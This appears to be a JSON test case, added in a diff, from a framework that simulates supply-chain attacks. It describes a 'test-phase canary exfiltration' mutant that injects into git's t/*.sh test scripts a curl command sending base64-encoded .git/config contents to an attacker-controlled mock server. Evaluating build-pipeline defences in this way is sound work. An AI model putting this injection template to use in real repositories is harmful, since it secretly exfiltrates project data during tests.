@@ -1,0 +1,38 @@
+{
+  "id": "test_canary_exfiltration_script",
+  "name": "Test-phase canary exfiltration via shell script injection",
+  "description": "Worked example of a test-phase mutant on the git target (t/*.sh). Modifies a test shell script to exfiltrate a simulated secret or canary token to a local mock server during test execution, validating network-based observables.",
+  "target_build_phase": "test",
+  "scheme": "dependency_aware",
+  "mode": "inject",
+  "injection_location": {
+    "file_glob": "t/*.sh",
+    "field": "script_body"
+  },
+  "placeholders": {
+    "TEST_SCRIPT": "relative path to the test script file in t/*.sh",
+    "MOCK_SERVER": "base URL or endpoint of the attacker-controlled mock server"
+  },
+  "attacker_values": {
+    "EXFIL_ENDPOINT": "/canary-exfil"
+  },
+  "template": {
+    "file_path": "{{TEST_SCRIPT}}",
+    "replacement_value": "\n# Injected test-phase canary exfiltration\ncurl -s \"http://{{MOCK_SERVER}}{{EXFIL_ENDPOINT}}?data=$(cat .git/config 2>/dev/null | base64)\"\n"
+  },
+  "preconditions": [
+    "project contains shell-based test scripts under t/*.sh",
+    "the test environment permits local or outbound network calls during test execution",
+    "the attacker can modify a test script prior to running the test suite"
+  ],
+  "effect": {
+    "observable": "network_fetch",
+    "check": {
+      "request_path": "/canary-exfil"
+    },
+    "requires": []
+  },
+  "source_attacks": [
+    "Supply chain test-phase telemetry/exfiltration patterns"
+  ]
+}
